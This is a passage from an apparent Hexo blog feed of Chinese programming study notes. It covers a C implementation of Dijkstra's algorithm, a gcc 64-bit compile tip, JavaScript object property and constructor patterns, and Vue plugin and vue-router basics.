class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c">#参考代码<span class="hljs-number">2</span>：<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;conio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X 10000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VertexNum  7  <span class="hljs-comment">//实际上共有六个顶点（1---6）</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EdgeNum  9</span><br><br><span class="hljs-type">int</span> Graph[VertexNum][VertexNum] =<br><span class="hljs-comment">//0  1  2  3  4  5  6</span><br>&#123; X, X, X, X, X, X, X,  <span class="hljs-comment">//0</span><br>  X, X, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, X, X, X,  <span class="hljs-comment">//1</span><br>  X, X, X, X, <span class="hljs-number">5</span>, X, X,  <span class="hljs-comment">//2</span><br>  X, X, <span class="hljs-number">2</span>, X, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, X,  <span class="hljs-comment">//3</span><br>  X, X, X, X, X, X, <span class="hljs-number">3</span>,  <span class="hljs-comment">//4</span><br>  X, X, X, X, <span class="hljs-number">2</span>, X, <span class="hljs-number">5</span>,  <span class="hljs-comment">//5</span><br>  X, X, X, X, X, X, X   <span class="hljs-comment">//6</span><br>&#125;;<br><br><span class="hljs-type">int</span> Visited[VertexNum];<br><span class="hljs-type">int</span> path[VertexNum];<br><span class="hljs-type">int</span> Distance[VertexNum];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Dijkstra</span><span class="hljs-params">(<span class="hljs-type">int</span> Begin)</span><br>&#123;<br>  <span class="hljs-type">int</span> MinEdge, Vertex, i,j, Edges;<br>  Edges = <span class="hljs-number">1</span>;<br>  Visited[Begin] = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i&lt;VertexNum; i++) Distance[i] = Graph[Begin][i];<br><br>  Distance[Begin] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;     1  2  3  4  5  6\\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-----------------------------------\\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;s:%d&quot;</span>, Edges);<br>  <span class="hljs-keyword">for</span>( i=<span class="hljs-number">1</span>; i&lt;VertexNum; i++)<br>  <span class="hljs-keyword">if</span> (Distance[i] == X) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  *&quot;</span>); <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d&quot;</span>,Distance[i]);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\\n&quot;</span>);<br>  <span class="hljs-keyword">while</span>( Edges&lt;VertexNum<span class="hljs-number">-1</span>)<br>  &#123;<br>    Edges++; MinEdge = X;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>; j&lt;VertexNum; j++)<br>    <span class="hljs-keyword">if</span> (Visited[j]==<span class="hljs-number">0</span> &amp;&amp; MinEdge &gt; Distance[j] )<br>    &#123;<br> Vertex = j; MinEdge = Distance[j];<br>    &#125;<br>    Visited[Vertex] = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;s:%d&quot;</span>,Edges);<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>; j&lt;VertexNum; j++)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (Visited[j] == <span class="hljs-number">0</span> &amp;&amp; Distance[Vertex] + Graph[Vertex][j] &lt;Distance[j])<br>      &#123;   Distance[j] = Distance[Vertex] + Graph[Vertex][j];<br>   path[j] = Vertex;<br>      &#125;<br>      <span class="hljs-comment">//printf(&quot;%6d&quot;,Distance[j]);</span><br>       <span class="hljs-keyword">if</span> (Distance[j] == X) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  *&quot;</span>); <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d&quot;</span>,Distance[j]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\\n&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">int</span> k;<br> <span class="hljs-comment">// clrscr();</span><br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;VertexNum; i++) &#123; Visited[i] = <span class="hljs-number">0</span>;  path[i] = <span class="hljs-number">1</span>;&#125;<br>  Dijkstra(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\\n\\nAll Path-------------------------\\n&quot;</span>);<br><br><br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>; i&lt;VertexNum; i++) <span class="hljs-comment">//printf(&quot;%5d&quot;,Visited[i]);</span><br>  &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] &quot;</span>,Distance[i]);<br>     k = i;<br>     <span class="hljs-keyword">do</span><br>     &#123;<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&lt;--&quot;</span>,k);<br>       k  = path[k];<br>     &#125; <span class="hljs-keyword">while</span> (k!=<span class="hljs-number">1</span>);<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1 \\n&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>王道考研</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于C语言的一些奇奇怪怪</title>
    <link href="/2021/03/05/C%E8%AF%AD%E8%A8%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
    <url>/2021/03/05/C%E8%AF%AD%E8%A8%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="关于C语言的一些奇奇怪怪"><a href="#关于C语言的一些奇奇怪怪" class="headerlink" title="关于C语言的一些奇奇怪怪"></a>关于C语言的一些奇奇怪怪</h1><p>1.编译后产生的exe文件在win10运行不了，报错：exe 与你运行的 Windows 版本不兼容。请查看计算机的系统信息，然后联系软件发布者。</p><p>解决方案：待解决，展示没有弄清楚。以前编译的exe文件照样可以使用！！！离谱😀</p><p>​    欢天喜地，解决啦！！！ 指令代码：gcc -m64 test.cpp -o test.exe</p><p>​    注解： -m64 //输出64位exe        -m32 //输出32位exe 🤤</p><p>2.将一个int数据切割？？？</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javascript高级程序设计（6）</title>
    <link href="/2021/01/12/Javascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%EF%BC%886%EF%BC%89/"/>
    <url>/2021/01/12/Javascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%EF%BC%886%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CH6"><a href="#CH6" class="headerlink" title="CH6"></a>CH6</h1><h3 id="6-1-对象"><a href="#6-1-对象" class="headerlink" title="6.1 对象"></a>6.1 对象</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//eailer</span><br><span class="hljs-keyword">var</span> person=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>person.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;Martin&quot;</span>;<br>person.<span class="hljs-property">age</span>=<span class="hljs-number">18</span>;<br>person.<span class="hljs-property">job</span>=<span class="hljs-string">&quot;Student&quot;</span>;<br><br>person.<span class="hljs-property">sayName</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">alert</span>(person.<span class="hljs-property">name</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);<br>&#125;;<br><br>person.<span class="hljs-property">sayAge</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">alert</span>(person.<span class="hljs-property">age</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">age</span>);<br>&#125;;<br><br>person.<span class="hljs-property">sayJob</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">alert</span>(person.<span class="hljs-property">job</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">job</span>);<br>&#125;;<br><br><br><span class="hljs-comment">//Face to object</span><br><span class="hljs-keyword">var</span> person1=&#123;<br>    <span class="hljs-attr">name</span>:<span class="hljs-string">&quot;Jack&quot;</span>,<br>    <span class="hljs-attr">age</span>:<span class="hljs-number">21</span>,<br>    <span class="hljs-attr">job</span>:<span class="hljs-string">&quot;Software Engineer.&quot;</span>,<br><br>    <span class="hljs-attr">sayName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;,<br>    <span class="hljs-attr">sayAge</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>);<br>    &#125;,<br>    <span class="hljs-attr">sayJob</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">job</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="6-1-1-属性类型：数据属性和访问器属性"><a href="#6-1-1-属性类型：数据属性和访问器属性" class="headerlink" title="6.1.1 属性类型：数据属性和访问器属性"></a>6.1.1 属性类型：数据属性和访问器属性</h4><h5 id="（1）数据属性："><a href="#（1）数据属性：" class="headerlink" title="（1）数据属性："></a>（1）数据属性：</h5><p>​        Configurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；</p><p>​        Enumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；</p><p>​        Writable：表示能否修改属性得值；注：直接在对象上定义的属性，默认值为true；</p><p>​        Value：属性的数据值；默认为undefined；</p><p>使用Object.defineProperty()方法修稿属性默认得特性；三个参数：属性所在的对象，属性名，描述符对象（以上四个数据属性）；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-keyword">var</span> person2=&#123;&#125;;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(person2,<span class="hljs-string">&quot;name&quot;</span>,&#123;<br>    <span class="hljs-title class_">Writable</span>:<span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">value</span>:<span class="hljs-string">&quot;Jack&quot;</span><br>&#125;);<br><br><span class="hljs-title function_">alert</span>(person2.<span class="hljs-property">name</span>);<br>person1.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;Nancy&quot;</span>;<br><span class="hljs-title function_">alert</span>(person2.<span class="hljs-property">name</span>);<br><br><span class="hljs-comment">//输出结果为Jack；非严格模式下，赋值被忽略；严格模式下，抛出错误；</span><br></code></pre></td></tr></table></figure><h5 id="（2）访问器属性："><a href="#（2）访问器属性：" class="headerlink" title="（2）访问器属性："></a>（2）访问器属性：</h5><p>​        Configurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；</p><p>​        Enumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；        </p><p>​        Get：读取属性时调用的函数，默认为undefined；</p><p>​        Set：写入属性时使用，默认为undefined；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//访问器属性实例</span><br><span class="hljs-keyword">var</span> book=&#123;<br>    <span class="hljs-attr">_year</span>:<span class="hljs-number">2021</span>,<br>    <span class="hljs-attr">edition</span>:<span class="hljs-number">1</span><br>&#125;;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(book,<span class="hljs-string">&quot;year&quot;</span>,&#123;<br>    <span class="hljs-attr">get</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span>;<br>    &#125;,<br>    <span class="hljs-attr">set</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">newValue</span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span>=newValue;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">edition</span>+=newValue-<span class="hljs-number">2021</span>;<br>    &#125;<br>&#125;);<br><br>book.<span class="hljs-property">year</span>=<span class="hljs-number">2023</span>;<br><span class="hljs-title function_">alert</span>(book.<span class="hljs-property">edition</span>);<br></code></pre></td></tr></table></figure><p>6.1.2 定义多个属性：Object.defineproperties()方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> book = &#123;&#125;;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperties</span>(book, &#123;<br>    <span class="hljs-attr">_year</span>: &#123;<br>        <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-number">2020</span><br>    &#125;,<br>    <span class="hljs-attr">edition</span>: &#123;<br>        <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-number">1</span><br>    &#125;,<br>    <span class="hljs-attr">year</span>: &#123;<br>        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span>;<br>        &#125;,<br>        <span class="hljs-attr">set</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">newValue</span>) &#123;<br>            <span class="hljs-keyword">if</span> (newValue &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">_year</span> = newValue;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">edition</span> += newValue - <span class="hljs-number">2020</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure><h3 id="6-2创建对象"><a href="#6-2创建对象" class="headerlink" title="6.2创建对象"></a>6.2创建对象</h3><h4 id="6-2-1工厂模式"><a href="#6-2-1工厂模式" class="headerlink" title="6.2.1工厂模式"></a>6.2.1工厂模式</h4><p>​    解决了创建对象的问题但是没有解决对象识别的问题；</p><h4 id="6-2-2构造函数模式"><a href="#6-2-2构造函数模式" class="headerlink" title="6.2.2构造函数模式"></a>6.2.2构造函数模式</h4><p>​    （1）创建一个新对象；</p><p>​    （2）将函数得作用域赋值给对象；</p><p>​    （3）执行构造函数得代码，为对象添加属性；</p><p>​    （4）返回新对象；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-comment">//工厂模式方法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createPerson</span>(<span class="hljs-params">name,age,job</span>)&#123;<br>    <span class="hljs-keyword">var</span> o=<span class="hljs-title class_">Object</span>();<br>    o.<span class="hljs-property">name</span>=name;<br>    o.<span class="hljs-property">age</span>=age;<br>    o.<span class="hljs-property">job</span>=job;<br>    o.<span class="hljs-property">sayHi</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">alert</span>(o.<span class="hljs-property">name</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> o;<br>&#125;<br><br><span class="hljs-comment">//构造函数方法模式</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name,age,job</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>=age;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">job</span>=job;<br><br>    <span class="hljs-comment">//函数模式的缺点，sayName函数会在每个实例中重复一遍，解决方法：讲该函数移到Person外，this.sayName=sayName调用;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayName</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;;<br><br>&#125;<br><br><span class="hljs-keyword">var</span> person1=<span class="hljs-title function_">createPerson</span>(<span class="hljs-string">&quot;Martin&quot;</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;Software enigneer&quot;</span>);<br><span class="hljs-keyword">var</span> person2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Matin&quot;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&quot;Cyber Security Engineer&quot;</span>);<br><br><br></code></pre></td></tr></table></figure><p>6.2.3 原型模式</p><p>好处：可以让所有对象实例共享它包含的属性和方法；（不必在构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中）</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>Javascript</tag>
      
      <tag>Javascript高级程序设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue.js实战（8）</title>
    <link href="/2020/12/05/Vue.js%E5%AE%9E%E6%88%98%EF%BC%888%EF%BC%89/"/>
    <url>/2020/12/05/Vue.js%E5%AE%9E%E6%88%98%EF%BC%888%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Ch11 插件</p><p>一、插件得创建和使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-comment">//公开的方法install，参数1：VUe构造器，参数2：可选对象     </span><br><span class="hljs-title class_">MyPlugin</span>.<span class="hljs-property">install</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params">Vue,options</span>)&#123;<br>            <span class="hljs-comment">//全剧注册组件</span><br>            <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;component-name&#x27;</span>,&#123;<br>                <span class="hljs-comment">//组件内容</span><br>            &#125;)<br>            <span class="hljs-comment">//添加实例方法</span><br>            <span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">$Notice</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                <span class="hljs-comment">//逻辑。。</span><br>            &#125;<br>            <span class="hljs-comment">//添加全局方法或属性</span><br>            <span class="hljs-title class_">Vue</span>.<span class="hljs-property">globalMethod</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                <span class="hljs-comment">//逻辑</span><br>            &#125;<br>            <span class="hljs-comment">//添加全局混合</span><br>            <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">mixin</span>(&#123;<br>                <span class="hljs-attr">mounted</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                    <span class="hljs-comment">//逻辑 </span><br>                &#125;<br>            &#125;)<br>        &#125;<br><span class="hljs-comment">//Vue.use()来使用插件</span><br>        <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">MyPlugin</span>)<br></code></pre></td></tr></table></figure><p>二、前端路由与Vue-router</p><p>​        1.实现方式</p><ul><li><p>利用url得hash，即所谓的锚点（#）</p></li><li><p>HTML5得History模式：需要服务器支持</p><p>2.vue-router基本用法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//在webpack项目中安装vue-router</span><br>npm install --save vue-router<br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Router</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Router</span>)<br><br><span class="hljs-comment">//index.js</span><br><span class="hljs-attr">routes</span>: [<br>    &#123;<br>      <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>      <span class="hljs-attr">component</span>: <span class="hljs-title class_">Movie</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/login&#x27;</span>,<br>        <span class="hljs-comment">//一次性全部加载</span><br>      <span class="hljs-attr">component</span>:<span class="hljs-title class_">Login</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/test&#x27;</span>,<br>      <span class="hljs-attr">component</span>:<span class="hljs-title class_">Test</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/index&#x27;</span>,<br>      <span class="hljs-attr">component</span>:<span class="hljs-function">(<span class="hljs-params">resolve</span>)=&gt;</span><span class="hljs-built_in">require</span>([<span class="hljs-string">&#x27;../components/Index.vue&#x27;</span>],resolve)<br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/about&#x27;</span>,<br>        <span class="hljs-comment">//懒加载（按需加载）mwebpack会把每一个路由打包为一个js文件，当请求到该页面时，才会去加载这个页面得js</span><br>      <span class="hljs-attr">component</span>:<span class="hljs-function">(<span class="hljs-params">resolve</span>)=&gt;</span><span class="hljs-built_in">require</span>([<span class="hljs-string">&#x27;../components/About.vue&#x27;</span>],resolve)<br>    &#125;,<br>    <span class="hljs-comment">//包含了用户Id得路由，指向同一界面；</span><br>     &#123;<br>      <span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/user/:id&#x27;</span>,<br>      <span class="hljs-attr">component</span>:<span class="hljs-function">(<span class="hljs-params">resolve</span>)=&gt;</span><span class="hljs-built_in">require</span>([<span class="hljs-string">&#x27;../components/User.vue&#x27;</span>],resolve)<br>    &#125;<br>  ] <br><br><br>******************************<br><br></code></pre></td></tr></table></figure><p>3.ES6小语法</p><p>在ES6中，使用let和const代替var来声明变量，const声明常量不可修改；</p><p>let和const得作用域是块（使用了异步路由后，编译出的每个js都叫做快（chunk)）；</p><p>4.小细节</p><p>在router.js中，设置mode为history才会开启HTML5得路由模式，通过’/‘设置路径，否则为’#‘</p><p>5.跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;router-link to=&quot;/about&quot;&gt;About&lt;/router-link&gt;<br><br>    //页面跳转方法2<br>    &lt;button @click=&quot;changeToMain&quot;&gt;Index&lt;/button&gt;<br>    <br>     methods:&#123;<br>    changeToMain()&#123;<br>      //不可以跳转到当前页面路由本身，会报出冗余错误<br>      this.$router.push(&#x27;/passage&#x27;);<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></li><li><p>tag:tag可以指定渲染成什么标签，比如tag=”li”,会渲染成li</p></li><li><p>replace：使用后不可以使用返回键回到上一个页面</p></li><li><p>go:在history记录中向前或者向后退多少步，参数为整数   this.$router.go(-1)或(2)</p></li></ul><p>三、状态</p><p>管理与Vuex</p><p>​    1.状态管理与使用场景</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">npm install --save 